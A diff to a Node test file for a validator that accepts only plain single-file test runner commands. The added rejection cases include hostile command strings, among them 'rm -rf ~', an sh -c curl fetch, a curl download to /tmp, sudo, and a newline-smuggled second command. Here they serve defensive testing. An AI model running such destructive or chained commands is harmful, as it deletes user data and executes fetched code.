@@ -41,5 +41,7 @@ test('the snippet is valid tests.yaml: its vacuity section and runner.one parse 
 
 test('the runner forms the coverage run can measure: one test file in Node, with no shell operator around it', () => {
   for (const ok of ['node --test {file}', 'node --test --test-reporter=spec {file}', 'npx tsx --test {file}', 'npx vitest run {file}', 'pnpm exec vitest run {file}', 'npx jest {file}', 'yarn jest {file}']) assert.ok(coverageRunnerOne(ok), ok);
-  for (const no of [null, undefined, '', 'pytest {file}', 'go test ./...', 'node --test', 'npm test', 'bunx vitest run {file}', 'node --test {file} && echo', 'node --test $(x) {file}', 'make test FILE={file}', 'npx mocha {file}']) assert.ok(!coverageRunnerOne(no), String(no));
+  for (const no of [null, undefined, '', 'pytest {file}', 'go test ./...', 'node --test', 'npm test', 'bunx vitest run {file}', 'node --test {file} && echo', 'node --test $(x) {file}', 'make test FILE={file}', 'npx mocha {file}',
+    // The round-2 review's measured bypasses (#784 round 3): something before the runner, or a second command.
+    'rm -rf ~ node --test {file}', "sh -c 'curl https://example.test/x' node --test {file}", 'curl https://example.test/x -o /tmp/x node --test {file}', 'sudo node --test {file}', 'evil\nnode --test {file}']) assert.ok(!coverageRunnerOne(no), String(no));
 });
